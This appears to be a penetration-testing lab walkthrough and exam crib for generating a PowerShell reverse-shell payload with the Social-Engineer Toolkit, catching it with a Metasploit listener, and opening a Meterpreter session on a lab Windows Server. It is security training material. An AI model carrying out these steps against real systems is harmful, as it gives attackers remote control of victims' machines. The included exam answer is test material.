# Exercise 4 – Evading Perimeter Defences Using Social-Engineer Toolkit (SET)

## Objective
Generate a PowerShell payload using SET and establish a Meterpreter session.

---

# Tools Used

- Social Engineering Toolkit (SET)
- Metasploit
- Windows PowerShell

---

# Step 1: Launch SET

```bash
sudo setoolkit
```

Password:

```
toor
```

Accept Terms:

```
y
```

---

# Step 2: Select Social Engineering Attacks

```
1. Social-Engineering Attacks
```

---

# Step 3: Select PowerShell Attack Vectors

```
9. PowerShell Attack Vectors
```

**Purpose:**

Generate a PowerShell payload.

---

# Step 4: Select Payload

```
1
```

**Purpose:**

Create a PowerShell reverse shell.

---

# Step 5: Enter Listener Details

LHOST (Parrot IP)

```
192.168.0.18
```

LPORT

```
443
```

Start Listener

```
yes
```

**Purpose:**

Metasploit listens for the incoming Meterpreter connection.

---

# Step 6: Copy Generated PowerShell Script

Location:

```
/root/.set/reports/powershell/

x86_powershell_injection.txt
```

> Press **Ctrl + H** to view the hidden **.set** folder.

---

# Step 7: Execute Payload

On **Windows Server 2019**

Open

```
Windows PowerShell
(Run as Administrator)
```

Paste the PowerShell script.

Press

```
Enter
```

---

# Step 8: Check Meterpreter Session

Switch back to Parrot.

Expected Output

```
Meterpreter session opened
```

**Meaning:**

The Windows machine successfully connected back to the Parrot machine.

---

# Lab Flow

```
SET
    ↓
Generate PowerShell Payload
    ↓
Start Metasploit Listener
    ↓
Copy Payload
    ↓
Paste into Windows PowerShell
    ↓
Payload Executes
    ↓
Meterpreter Session Opens
```

---

# Important Files

```
/root/.set/reports/powershell/

x86_powershell_injection.txt
```

---

# Commands Used

```bash
sudo setoolkit
```

---

# Menu Selection

```
1 → Social Engineering Attacks

9 → PowerShell Attack Vectors

1 → PowerShell Reverse Shell
```

---

# Viva Questions

### What is SET?

Social Engineering Toolkit used to perform client-side attacks.

### Why use PowerShell?

To execute payloads directly on Windows.

### Why start the listener?

To receive the reverse connection from the target.

### What is Meterpreter?

An advanced Metasploit shell used after successful exploitation.

### Where is the generated PowerShell payload stored?

```
/root/.set/reports/powershell/x86_powershell_injection.txt
```

---

# Exam Answer

**Question 7.4.1**

**Serial number of the PowerShell Attack Vector under Social Engineering Attacks:**

```
9
```
````
